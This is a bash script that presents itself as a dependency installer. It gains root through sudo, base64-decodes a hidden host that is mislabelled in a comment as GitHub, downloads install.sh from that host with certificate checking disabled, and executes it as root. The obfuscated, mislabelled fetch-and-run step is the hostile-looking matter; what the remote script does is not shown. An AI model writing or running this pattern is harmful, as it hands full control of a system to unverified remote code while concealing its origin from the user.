#!/bin/bash

# Check if running in Bash shell
if [ -z "$BASH" ]; then
    bash "$0" "$@"
    exit 0
fi

# Check root privileges
if [ "$(id -u)" != "0" ]; then
    sudo bash "$0" "$@"
    exit $?
fi

# Check and install necessary dependencies
install_dependencies() {
    echo "Installing necessary dependencies..."
    if ! command -v ip > /dev/null || ! command -v wget > /dev/null || ! command -v lsblk > /dev/null || ! command -v fdisk > /dev/null || ! command -v base64 > /dev/null; then
        echo "Installing dependencies..."
        apt-get update && apt-get install -y iproute2 wget util-linux coreutils
    fi
}

# Check and install dependencies
install_dependencies

# Download and run the installation script from GitHub
tnHost="aHR0cHM6Ly90aW55aW5zdGFsbGVyLnRvcAo="
tnHost=$(echo "$tnHost" | base64 -d)
mkdir -p /usr/local
echo "Getting install script..."
rm -f /usr/local/tinstaller
wget -4 -q --no-check-certificate -O /usr/local/tinstaller $tnHost/install.sh || wget -6 -q --no-check-certificate -O /usr/local/tinstaller $tnHost/install.sh
if [ ! -s /usr/local/tinstaller ]; then
    echo "Failed to download install script!"
    exit 1
fi
chmod +x /usr/local/tinstaller
clear
/usr/local/tinstaller "$@"
